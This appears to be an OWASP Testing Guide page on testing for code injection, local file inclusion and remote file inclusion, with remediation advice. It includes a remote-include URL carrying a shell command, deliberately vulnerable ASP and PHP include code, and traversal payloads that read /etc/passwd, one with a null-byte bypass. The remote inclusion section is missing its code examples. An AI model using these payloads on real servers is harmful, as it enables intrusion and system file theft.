============================================================================================
OTG-INPVAL-012 (Code Injection 침투 테스트)
============================================================================================

|

개요
============================================================================================

This section describes how a tester can check if it is possible to
enter code as input on a web page and have it executed by the
web server.
In Code Injection testing, a tester submits input that is processed
by the web server as dynamic code or as an included file. These
tests can target various server-side scripting engines, e.g.., ASP
or PHP. Proper input validation and secure coding practices need
to be employed to protect against these attacks.

|

테스트 방법
============================================================================================

Black Box testing
---------------------------------------------------------------------------------------

**Testing for PHP Injection vulnerabilities**

Using the querystring, the tester can inject code (in this example,
a malicious URL) to be processed as part of the included file:

**예상결과**

.. code-block:: html

    http://www.example.com/uptime.php?pin=http://www.
    example2.com/packx1/cs.jpg?&cmd=uname%20-a

The malicious URL is accepted as a parameter for the PHP page,
which will later use the value in an included file.

|

Gray Box testing
---------------------------------------------------------------------------------------

**Testing for ASP Code Injection vulnerabilities**

Examine ASP code for user input used in execution functions.
Can the user enter commands into the Data input field? Here, the
ASP code will save the input to a file and then execute it:


.. code-block:: html

    <%
    If not isEmpty(Request( “Data” ) ) Then
    Dim fso, f
    ‘User input Data is written to a file named data.txt
    Set fso = CreateObject(“Scripting.FileSystemObject”)
    Set f = fso.OpenTextFile(Server.MapPath( “data.txt” ), 8, True)
    f.Write Request(“Data”) & vbCrLf
    f.close
    Set f = nothing
    Set fso = Nothing
    ‘Data.txt is executed
    Server.Execute( “data.txt” )
    Else
    %>

.. code-block:: html

    <form>
    <input name=”Data” /><input type=”submit” name=”Enter
    Data” />
    </form>
    <%
    End If
    %>)))

|

References
============================================================================================

- Security Focus - http://www.securityfocus.com
- Insecure.org - http://www.insecure.org
- Wikipedia - http://www.wikipedia.org
- Reviewing Code for OS Injection

|

|

============================================================================================
Testing for Local File Inclusion
============================================================================================

개요
============================================================================================

The File Inclusion vulnerability allows an attacker to include a file,
usually exploiting a “dynamic file inclusion” mechanisms implemented
in the target application. The vulnerability occurs due to
the use of user-supplied input without proper validation.
This can lead to something as outputting the contents of the file,
but depending on the severity, it can also lead to:

- Code execution on the web server
- Code execution on the client-side such as JavaScript which can
lead to other attacks such as cross site scripting (XSS)
- Denial of Service (DoS)
- Sensitive Information Disclosure

Local File Inclusion (also known as LFI) is the process of including
files, that are already locally present on the server, through the
exploiting of vulnerable inclusion procedures implemented in the
application. This vulnerability occurs, for example, when a page
receives, as input, the path to the file that has to be included and
this input is not properly sanitized, allowing directory traversal
characters (such as dot-dot-slash) to be injected. Although
most examples point to vulnerable PHP scripts, we should keep
in mind that it is also common in other technologies such as JSP,
ASP and others.

|

테스트 방법
============================================================================================

Since LFI occurs when paths passed to “include” statements are
not properly sanitized, in a blackbox testing approach, we should
look for scripts which take filenames as parameters.
Consider the following example:

.. code-block:: html

    http://vulnerable_host/preview.php?file=example.html

This looks as a perfect place to try for LFI. If an attacker is lucky
enough, and instead of selecting the appropriate page from the 


array by its name, the script directly includes the input parameter,
it is possible to include arbitrary files on the server.
Typical proof-of-concept would be to load passwd file:

.. code-block:: html

    http://vulnerable_host/preview.php?file=../../../../etc/passwd

If the above mentioned conditions are met, an attacker would
see something like the following:

.. code-block:: html

    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    alex:x:500:500:alex:/home/alex:/bin/bash
    margo:x:501:501::/home/margo:/bin/bash
    ...


Very often, even when such vulnerability exists, its exploitation is a
bit more complex. Consider the following piece of code:

.. code-block:: html

    <?php “include/”.include($_GET[‘filename’].“.php”); ?>

In the case, simple substitution with arbitrary filename would not
work as the postfix ‘php’ is appended. In order to bypass it, a technique
with null-byte terminators is used. Since %00 effectively presents
the end of the string, any characters after this special byte will
be ignored. Thus, the following request will also return an attacker
list of basic users attributes:

.. code-block:: html

    http://vulnerable_host/preview.php?file=../../../../etc/passwd%00

References
============================================================================================

- Wikipedia - http://www.wikipedia.org/wiki/Local_File_Inclusion
- Hakipedia - http://hakipedia.com/index.php/Local_File_Inclusion

Remediation
============================================================================================

The most effective solution to eliminate file inclusion vulnerabilities
is to avoid passing user-submitted input to any filesystem/framework
API. If this is not possible the application can maintain a white
list of files, that may be included by the page, and then use an identifier
(for example the index number) to access to the selected file. Any
request containing an invalid identifier has to be rejected, in this way
there is no attack surface for malicious users to manipulate the path.

|

|

============================================================================================
Testing for Remote File Inclusion
============================================================================================

Summary
============================================================================================

The File Inclusion vulnerability allows an attacker to include a file,
usually exploiting a “dynamic file inclusion” mechanisms implemented
in the target application. The vulnerability occurs due to the use of
user-supplied input without proper validation.

This can lead to something as outputting the contents of the file, but
depending on the severity, it can also lead to:

- Code execution on the web server
- Code execution on the client-side such as JavaScript which can lead
to other attacks such as cross site scripting (XSS)
- Denial of Service (DoS)
- Sensitive Information Disclosure

Remote File Inclusion (also known as RFI) is the process of including
remote files through the exploiting of vulnerable inclusion procedures
implemented in the application. This vulnerability occurs, for
example, when a page receives, as input, the path to the file that has
to be included and this input is not properly sanitized, allowing external
URL to be injected. Although most examples point to vulnerable
PHP scripts, we should keep in mind that it is also common in other
technologies such as JSP, ASP and others.

|

테스트 방법
============================================================================================

Since RFI occurs when paths passed to “include” statements are not
properly sanitized, in a blackbox testing approach, we should look for
scripts which take filenames as parameters. Consider the following
PHP example:
In this example the path is extracted from the HTTP request and no
input validation is done (for example, by checking the input against a
white list), so this snippet of code results vulnerable to this type of
attack. Consider infact the following URL:
In this case the remote file is going to be included and any code contained
in it is going to be run by the server.

|

References
============================================================================================

Whitepapers
------------------------------------------------------------------------------------

• “Remote File Inclusion”: http://projects.webappsec.org/w/page/13246955/Remote%20File%20Inclusion
• Wikipedia: “Remote File Inclusion”: http://en.wikipedia.org/wiki/Remote_File_Inclusion

Remediation
============================================================================================

The most effective solution to eliminate file inclusion vulnerabilities
is to avoid passing user-submitted input to any filesystem/framework
API. If this is not possible the application can maintain a white
list of files, that may be included by the page, and then use an identifier
(for example the index number) to access to the selected file. Any
request containing an invalid identifier has to be rejected, in this way
there is no attack surface for malicious users to manipulate the path.



